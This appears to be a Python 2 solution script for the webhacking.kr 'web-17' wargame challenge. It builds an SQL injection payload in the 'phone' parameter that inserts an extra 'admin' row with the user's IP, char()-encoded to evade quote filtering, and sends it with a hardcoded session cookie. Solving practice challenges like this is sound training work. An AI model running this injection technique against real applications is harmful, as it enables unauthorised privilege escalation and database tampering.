#-*- coding: utf-8 -*-
import urllib2
import CookieManager
httpConnection = None

ipAddress = ""
httpConnection = None
print "[+] Find IP Address"
try:
    httpRequest = urllib2.Request("https://api.ipify.org")
    httpConnection = urllib2.urlopen(httpRequest)
    ipAddress = httpConnection.read()
    print "[*] Your IP Address is [", ipAddress, "]"
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

adminString = "char(" + ",".join("{:d}".format(ord(c)) for c in "admin") + ")"
ipAddress = "char(" + ",".join("{:d}".format(ord(c)) for c in ipAddress) + ")"
parameter = "?phone=" + "1024),(" + adminString + "," + ipAddress + ",1024"
challengeUrl = "http://webhacking.kr/challenge/web/web-17/index.php"+parameter
CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
